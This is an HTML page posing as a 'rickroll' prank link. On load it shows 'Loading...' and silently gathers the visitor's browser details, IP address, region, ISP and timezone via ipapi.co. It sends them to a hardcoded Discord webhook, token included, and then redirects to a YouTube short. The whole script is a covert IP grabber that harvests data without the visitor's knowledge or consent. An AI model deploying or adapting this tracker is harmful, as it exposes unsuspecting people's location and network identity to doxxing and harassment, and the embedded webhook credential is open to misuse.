<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>rickrolled</title>
</head>
<body>

<h2>Loading...</h2>

<script>
const webhookURL = "https://discord.com/api/webhooks/1480136659558469655/_kuA3HTmEfllWrlklOLv2zKJg21zPyGTjroUICocqJT5UJXHP6c2H5YJd4Cqj2YzrScB";

// Get browser info
const browser = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language;

// Fetch IP and location info from ipapi.co
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip || "Unknown";
    const region = data.region || data.city || "Unknown";
    const isp = data.org || "Unknown";          // ISP / Organization
    const timezone = data.timezone || "Unknown"; // Timezone

    // Prepare Discord webhook message
    const payload = {
      content: "**New Website Visitor**",
      embeds: [
        {
          title: "Visitor Info",
          color: 5763719,
          fields: [
            { name: "Browser (User Agent)", value: browser, inline: false },
            { name: "Platform", value: platform, inline: true },
            { name: "Language", value: language, inline: true },
            { name: "IP Address", value: ip, inline: true },
            { name: "Region", value: region, inline: true },
            { name: "ISP", value: isp, inline: true },
            { name: "Timezone", value: timezone, inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    // Send data to Discord webhook
    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if(res.ok) console.log("Webhook sent successfully");
      else console.error("Failed to send webhook");
    })
    .catch(console.error)
    .finally(() => {
      // Wait 0.1 seconds then redirect
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
      }, 100); // 100 ms = 0.1 second
    });

  })
  .catch(err => {
    console.error("Failed to fetch IP info", err);
    // Redirect even if fetch fails
    setTimeout(() => {
      window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
    }, 100);
  });
</script>

</body>
</html>
